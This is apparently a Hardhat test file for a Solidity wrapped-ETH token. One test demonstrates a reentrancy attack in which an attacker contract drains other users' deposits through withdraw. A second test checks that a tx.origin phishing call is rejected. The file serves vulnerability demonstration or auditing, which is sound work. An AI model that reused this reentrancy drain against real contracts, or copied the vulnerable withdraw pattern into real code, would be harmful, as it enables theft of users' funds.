import type { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/types";
import { expect } from "chai";
import { network } from "hardhat";
import type { WrappedTokenV3 } from "../types/ethers-contracts/index.js";

const { ethers } = await network.create();

const NAME = "MDD Wrapped Token";
const SYMBOL = "MDD-WETH";

describe("WrappedTokenV3", function () {
  const amount = ethers.parseEther("5");
  let token: WrappedTokenV3, owner: HardhatEthersSigner, alice: HardhatEthersSigner, bob: HardhatEthersSigner;

  beforeEach(async function () {
    [owner, alice, bob] = await ethers.getSigners();
    token = await ethers.deployContract("WrappedTokenV3", [NAME, SYMBOL, owner.address]);
    await token.connect(alice).deposit(amount, { value: amount });
  });

  describe("withdraw", function () {
    it("[vulnerability]", async function () {
      // the attacker re-enters withdraw and drains the deposits of other users
      const attacker = await ethers.deployContract("ReentrancyAttacker", [await token.getAddress()], bob);
      const attackAmount = ethers.parseEther("1");

      const tokenBalanceBefore = await ethers.provider.getBalance(token.getAddress());
      const bobEthBalanceBefore = await ethers.provider.getBalance(bob.address);

      // Bob sends 1 ETH and gets back 6 ETH: Bob's deposit plus Alice's
      const tx = await attacker.connect(bob).attack({ value: attackAmount });
      const receipt = await tx.wait();
      const gasUsed = receipt!.fee;

      const tokenBalanceAfter = await ethers.provider.getBalance(token.getAddress());
      expect(tokenBalanceAfter).to.equal(0n);

      const bobEthBalanceAfter = await ethers.provider.getBalance(bob.address);
      expect(bobEthBalanceAfter).to.equal(bobEthBalanceBefore + tokenBalanceBefore - gasUsed);

      // Alice's balance is still recorded, but there is no ETH left to pay it
      expect(await token.balanceOf(alice.address)).to.equal(amount);
    });
  });

  describe("emergencyWithdraw", function () {
    it("should revert if a malicious contract calls it on behalf of the owner", async function () {
      const attacker = await ethers.deployContract("TxOriginAttacker", [await token.getAddress()], bob);

      await expect(attacker.connect(owner).claimAirdrop()).to.be.revertedWith("Caller is not the owner");
    });
  });
});
